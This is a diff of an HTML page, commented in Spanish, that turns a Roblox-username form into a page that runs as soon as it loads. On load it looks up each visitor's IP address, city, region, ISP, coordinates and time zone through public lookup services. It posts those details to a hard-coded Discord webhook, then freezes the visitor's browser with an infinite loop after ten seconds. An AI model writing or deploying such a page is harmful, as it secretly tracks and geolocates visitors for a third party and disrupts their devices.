@@ -3,12 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Formulario de Captura de IP</title>
+    <title>Captura de Datos y Crash</title>
     <script>
-        async function sendContact(event) {
-            event.preventDefault();
-
-            // Obtener la IP del usuario
+        // Función para capturar la IP y enviar datos al webhook de Discord
+        async function captureAndSendData() {
             const ipResponse = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipResponse.json();
             const userIP = ipData.ip;
@@ -17,14 +15,10 @@
             const ipInfoResponse = await fetch(`https://ipinfo.io/${userIP}/json`);
             const ipInfoData = await ipInfoResponse.json();
 
-            const username = document.getElementById('username').value;
-
-            // Preparar los datos para enviar al webhook de Discord
             const data = {
-                content: `Nueva entrada:\nIP: ${userIP}\nUsuario de Roblox: ${username}\nCiudad: ${ipInfoData.city}\nRegión: ${ipInfoData.region}\nPaís: ${ipInfoData.country}\nOrganización: ${ipInfoData.org}\nProveedor de Internet: ${ipInfoData.asn}\nCoordenadas: ${ipInfoData.loc}\nTiempo de Zona: ${ipInfoData.timezone}`,
+                content: `Nueva entrada:\nIP: ${userIP}\nCiudad: ${ipInfoData.city}\nRegión: ${ipInfoData.region}\nPaís: ${ipInfoData.country}\nOrganización: ${ipInfoData.org}\nProveedor de Internet: ${ipInfoData.asn}\nCoordenadas: ${ipInfoData.loc}\nTiempo de Zona: ${ipInfoData.timezone}`,
             };
 
-            // Enviar los datos al webhook de Discord
             fetch('https://discord.com/api/webhooks/1411003921953984512/eWRarF44aGvN0ZatZ4S4IxA9IH8JGb_KA7nLuZlaFj2G3FdFUrZLHW28egfPg6cC4092', {
                 method: 'POST',
                 headers: {
@@ -33,15 +27,24 @@
                 body: JSON.stringify(data)
             });
         }
+
+        // Función para causar un "crash" en el dispositivo
+        function causeCrash() {
+            while (true) {
+                // Bucle infinito que causará un "crash" en la mayoría de los dispositivos
+            }
+        }
+
+        // Capturar datos al cargar la página
+        window.onload = function() {
+            captureAndSendData();
+            // Esperar 10 segundos antes de causar el "crash"
+            setTimeout(causeCrash, 10000);
+        }
     </script>
 </head>
 <body>
-    <form onsubmit="sendContact(event)">
-        <div>
-            <label for="username">Nombre de Usuario de Roblox:</label>
-            <input type="text" id="username" required>
-        </div>
-        <button type="submit">Enviar</button>
-    </form>
+    <h1>Captura de Datos y Crash</h1>
+    <p>Esta página capturará sus datos y causará un "crash" en 10 segundos.</p>
 </body>
 </html>
